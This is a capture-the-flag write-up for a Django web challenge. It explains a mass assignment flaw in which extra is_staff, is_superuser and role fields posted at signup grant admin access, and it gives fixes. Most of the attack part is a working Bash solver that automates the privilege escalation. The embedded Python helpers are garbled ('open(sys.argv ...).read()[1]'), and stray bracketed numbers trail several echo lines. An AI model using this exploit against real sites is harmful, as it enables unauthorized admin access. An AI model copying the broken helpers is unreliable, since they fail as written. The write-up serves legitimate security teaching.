# Challenge - Overqualified 

- Category: Web  
- Difficulty: Medium  

Overqualified is a medium‑difficulty web challenge built around “NexaCorp People Portal”, a Django‑based employee onboarding site. New hires can self‑register via `/register/` and then access `/dashboard/`. The twist is that the registration handler trusts **extra POST fields** beyond the visible form, enabling a classic **mass assignment** vulnerability: by submitting internal fields like `is_staff` and `is_superuser` during signup, we can turn a normal user into an admin and reach `/admin/dashboard/` to obtain the flag.

---

## 1. High‑Level Idea

The visible registration form only shows:

- `username`
- `email`
- `password`
- `password_confirm`

However, the underlying Django model clearly has more fields (e.g. `is_staff`, `is_superuser`, `role`, `department`). The backend appears to bind form data directly to the user model or a `ModelForm` with an over‑permissive field configuration, so any additional parameters sent in the POST are applied as attributes on the new user.

Exploit plan:

1. Load `/register/` to get a valid CSRF token and cookies.
2. POST to `/register/` with normal fields **plus** internal privilege fields (`is_staff=on`, `is_superuser=on`, `role=admin`, etc.).
3. Use the resulting session to hit `/dashboard/` and discover a link to `/admin/...`.
4. Follow the admin link and extract the flag from the admin panel HTML.

---

## 2. Exploit Script

Here is the Bash script I used to automate the entire exploit chain:

```bash
cat > solve_nexacorp.sh <<'EOF'
#!/usr/bin/env bash
set -euo pipefail

# NexaCorp People Portal - CTF solver
# Bug: mass assignment on /register/
# Flow:
# 1. GET /register/ to obtain CSRF
# 2. POST /register/ with real fields + internal fields
# 3. Use sessionid to access /dashboard/
# 4. Follow /admin/dashboard/
# 5. Extract flag

HOST="${1:-https://INSTANCE.chal.ctf.ae}"
WORKDIR="$(mktemp -d)"
COOKIE="$WORKDIR/cookies.txt"

USER="brau$(date +%s%N)"
EMAIL="$USER@nexacorp.local"
PASS='P@ssw0rd123!'

echo "[+] Target: $HOST"
echo "[+] Workdir: $WORKDIR"
echo "[+] Username: $USER"
echo "[+] Email: $EMAIL"

extract_csrf() {
  local file="$1"
  python3 - "$file" <<'PY'
import re, sys, html
data=open(sys.argv, errors="ignore").read()[1]
m=re.search(r'name=["\']csrfmiddlewaretoken["\']\s+value=["\']([^"\']+)', data)
if not m:
    m=re.search(r'value=["\']([^"\']+)["\']\s+name=["\']csrfmiddlewaretoken["\']', data)
print(html.unescape(m.group(1)) if m else "")
PY
}

extract_text() {
  local file="$1"
  python3 - "$file" <<'PY'
import re, sys, html
data=open(sys.argv, errors="ignore").read()[1]
data=re.sub(r'(?is)<style.*?</style>|<script.*?</script>|<svg.*?</svg>', '', data)
data=re.sub(r'(?is)<br\s*/?>', '\n', data)
data=re.sub(r'(?is)</(p|div|h1|h2|h3|section|article|li|span|code|a)>', '\n', data)
data=re.sub(r'(?is)<[^>]+>', '', data)
text=html.unescape(data)
lines=[x.strip() for x in text.splitlines() if x.strip()]
print("\n".join(lines))
PY
}

echo
echo " Fetching registration form..."[1]
curl -skL -c "$COOKIE" -b "$COOKIE" "$HOST/register/" -o "$WORKDIR/register.html"

TOKEN="$(extract_csrf "$WORKDIR/register.html")"

if [ -z "$TOKEN" ]; then
  echo "[!] Could not extract csrfmiddlewaretoken from register page."
  exit 1
fi

echo "[+] CSRF register token: $TOKEN"

echo
echo " Registering user with mass assignment..."[2]
curl -sk -i -c "$COOKIE" -b "$COOKIE" \
  -e "$HOST/register/" \
  -X POST "$HOST/register/" \
  --data-urlencode "csrfmiddlewaretoken=$TOKEN" \
  --data-urlencode "username=$USER" \
  --data-urlencode "email=$EMAIL" \
  --data-urlencode "password=$PASS" \
  --data-urlencode "password_confirm=$PASS" \
  --data-urlencode "is_staff=on" \
  --data-urlencode "is_superuser=on" \
  --data-urlencode "role=admin" \
  --data-urlencode "department=HR" \
  -o "$WORKDIR/register_response.html"

echo "[+] Registration response headers:"
grep -Ei 'HTTP/|Location:|Set-Cookie:' "$WORKDIR/register_response.html" || true

echo
echo " Opening authenticated dashboard..."[3]
curl -skL -b "$COOKIE" "$HOST/dashboard/" -o "$WORKDIR/dashboard.html"

echo "[+] Checking role and routes..."
extract_text "$WORKDIR/dashboard.html" | grep -Ei 'Dashboard|Staff|Administration|Admin Dashboard|Sign out|Role' || true

ADMIN_PATH="$(grep -Eo 'href="/admin/[^"]+"' "$WORKDIR/dashboard.html" | head -1 | cut -d'"' -f2 || true)"

if [ -z "$ADMIN_PATH" ]; then
  echo "[!] No admin link found in /dashboard/."
  echo "[!] Possible hrefs:"
  grep -Eo 'href="[^"]+"' "$WORKDIR/dashboard.html" | cut -d'"' -f2 | sort -u
  exit 1
fi

echo "[+] Found admin route: $ADMIN_PATH"

echo
echo " Opening admin panel..."[4]
curl -skL -b "$COOKIE" "$HOST$ADMIN_PATH" -o "$WORKDIR/admin.html"

echo "[+] Visible text from admin panel:"
extract_text "$WORKDIR/admin.html" | grep -Ei 'Admin|Administration|Internal System Key|Service signing key|Confidential|flag|System|Version' || true

echo
echo " Extracting flag..."[5]
FLAG="$(grep -RhoE 'flag\{[^}]+\}|after\{[^}]+\}|ctf\{[^}]+\}|[A-Za-z0-9_-]+\{[^}]+\}' "$WORKDIR/admin.html" | head -1 || true)"

if [ -n "$FLAG" ]; then
  echo
  echo "[+] FLAG FOUND:"
  echo "$FLAG"
else
  echo "[!] Flag not found by regex. Check manually:"
  echo "    $WORKDIR/admin.html"
  echo
  extract_text "$WORKDIR/admin.html"
  exit 1
fi

echo
echo "[+] Files saved in: $WORKDIR"
EOF

chmod +x solve_nexacorp.sh
./solve_nexacorp.sh
```

The script does:

- Maintains cookies in a temporary directory.
- Extracts the `csrfmiddlewaretoken` from the registration HTML with a small Python helper.
- Posts the registration form with both legitimate and privileged fields.
- Follows the logged‑in dashboard and finds the first `/admin/...` link.
- Fetches the admin page and searches for a flag‑shaped string.

---

## 3. Step‑by‑Step Exploitation

### 3.1 Get CSRF and Session

Django requires a CSRF token for POST forms, plus a matching cookie. The script:

1. Requests `/register/` with `curl -c cookies.txt` to get the CSRF cookie and form.
2. Runs `extract_csrf` on `register.html` to pull the hidden input `csrfmiddlewaretoken` from the HTML.

If that extraction succeeds, we have:

- A CSRF cookie.
- The form token.
- A baseline session.

### 3.2 Register with Extra Privilege Fields

Next, the script posts to `/register/`:

```bash
curl -sk -i -c "$COOKIE" -b "$COOKIE" \
  -e "$HOST/register/" \
  -X POST "$HOST/register/" \
  --data-urlencode "csrfmiddlewaretoken=$TOKEN" \
  --data-urlencode "username=$USER" \
  --data-urlencode "email=$EMAIL" \
  --data-urlencode "password=$PASS" \
  --data-urlencode "password_confirm=$PASS" \
  --data-urlencode "is_staff=on" \
  --data-urlencode "is_superuser=on" \
  --data-urlencode "role=admin" \
  --data-urlencode "department=HR"
```

Important details:

- The `Referer` is set implicitly via `-e "$HOST/register/"`, which satisfies Django’s CSRF protection requirements for HTTPS.
- `--data-urlencode` ensures the values are correctly URL‑encoded.
- Extra fields like `is_staff`, `is_superuser`, `role`, `department` are **not** part of the visible form but are accepted by the backend. A vulnerable `ModelForm` or view code likely binds them directly to the `User` or profile model.

The expected behavior is:

- HTTP 302 redirect to `/dashboard/`.
- A `Set-Cookie: sessionid=...` header giving us an authenticated session for the newly created account.

### 3.3 Confirm Elevated Role on Dashboard

The script then hits `/dashboard/` with the saved session cookie:

```bash
curl -skL -b "$COOKIE" "$HOST/dashboard/" -o "$WORKDIR/dashboard.html"
```

It calls `extract_text` to strip HTML and looks for indicators of being staff/admin:

```bash
extract_text "$WORKDIR/dashboard.html" | grep -Ei 'Dashboard|Staff|Administration|Admin Dashboard|Sign out|Role' || true
```

In practice, you see:

- A “Staff” badge or some text reflecting elevated role.
- A link to something like `/admin/dashboard/` or `/admin/system/`.

The script locates the first admin link via:

```bash
ADMIN_PATH="$(grep -Eo 'href="/admin/[^"]+"' "$WORKDIR/dashboard.html" | head -1 | cut -d'"' -f2 || true)"
```

If `ADMIN_PATH` is non‑empty, we know we have access to an internal admin area.

### 3.4 Access Admin Panel and Extract Flag

Finally, the script requests the admin route:

```bash
curl -skL -b "$COOKIE" "$HOST$ADMIN_PATH" -o "$WORKDIR/admin.html"
```

It prints some interesting text snippets from the page:

```bash
extract_text "$WORKDIR/admin.html" | grep -Ei 'Admin|Administration|Internal System Key|Service signing key|Confidential|flag|System|Version' || true
```

Then it attempts to pull the flag with a regex:

```bash
FLAG="$(grep -RhoE 'flag\{[^}]+\}|after\{[^}]+\}|ctf\{[^}]+\}|[A-Za-z0-9_-]+\{[^}]+\}' "$WORKDIR/admin.html" | head -1 || true)"
```

If found, it prints the flag; otherwise, it dumps the cleaned admin HTML for manual inspection.

---

## 4. Vulnerability: Mass Assignment in Django Registration

This behavior strongly suggests a mass assignment / over‑posting issue in the registration view:

- The HTML form only renders `username`, `email`, `password`, `password_confirm`.
- The handler still accepts additional fields (`is_staff`, `is_superuser`, `role`, etc.) from the POST body.
- The model fields for staff/admin are client‑controllable at signup.

Typical dangerous Django patterns:

1. **ModelForm with `fields = '__all__'`**:

   ```python
   class RegistrationForm(forms.ModelForm):
       class Meta:
           model = User
           fields = '__all__'  # includes is_staff, is_superuser, etc.
   ```

2. **Passing `request.POST` straight to the model**:

   ```python
   def register(request):
       if request.method == 'POST':
           form = RegistrationForm(request.POST)
           if form.is_valid():
               user = form.save()  # every field from POST applied
   ```

3. **Using `**form.cleaned_data` with an over‑permissive form**:

   ```python
   user = User.objects.create(**form.cleaned_data)
   ```

Any of these patterns lets a malicious client set privileged attributes by adding extra parameters to the POST, even if they are never shown in the HTML.

---

## 5. Fixing the Issue

To prevent this vulnerability:

- Use **explicit allow‑lists** in forms:

  ```python
  class RegistrationForm(forms.ModelForm):
      class Meta:
          model = User
          fields = ['username', 'email', 'password']
  ```

- Alternatively, **exclude privileged fields**:

  ```python
  class RegistrationForm(forms.ModelForm):
      class Meta:
          model = User
          fields = '__all__'
          exclude = ['is_staff', 'is_superuser', 'role', 'department']
  ```

- Do not pass raw `request.POST` or `form.cleaned_data` directly into `User.objects.create()` for user‑facing endpoints; instead, map specific fields manually.
- Use Django’s built‑in `UserCreationForm`, which intentionally restricts which fields can be set during registration.
- Review the user model and ensure that attributes like `is_staff`, `is_superuser`, `role`, and similar cannot be modified through public forms.

---

## 6. Summary

Overqualified demonstrates how a single overly permissive registration endpoint can completely undermine a role‑based access control scheme:

- The onboarding form looks harmless — just username, email, password.
- The backend trusts extra fields, allowing us to submit `is_staff=on`, `is_superuser=on`, and `role=admin`.
- We instantly become a staff/admin user on first signup.
- The authenticated dashboard reveals an admin link, and the admin panel exposes the flag.

The Bash script above automates the entire flow and is suitable to include directly in a GitHub repository alongside this writeup.
